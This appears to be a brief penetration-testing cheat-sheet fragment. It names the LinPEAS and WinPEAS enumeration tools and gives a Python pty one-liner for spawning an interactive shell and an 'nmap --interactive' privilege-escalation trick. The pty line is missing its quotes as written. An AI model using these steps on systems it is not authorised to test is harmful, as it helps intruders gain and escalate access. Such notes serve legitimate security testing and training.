|  Name   |                                      Description                                       |                   Source & Documentation                    |
|:-------:|:--------------------------------------------------------------------------------------:|:-----------------------------------------------------------:|
| Linpeas | Gather useful post exploitation datas on GNU/Linux, watch privesc opportunities faster | https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS |
| Winpeas |  Gather useful post exploitation datas on Windows, watch privesc opportunities faster  | https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS |



- Spawn interactive shell: 
```vim
python -c import pty;pty.spawn("/bin/bash")
```

- Privilege escalation with nmap :  
```vim
nmap --interactive
```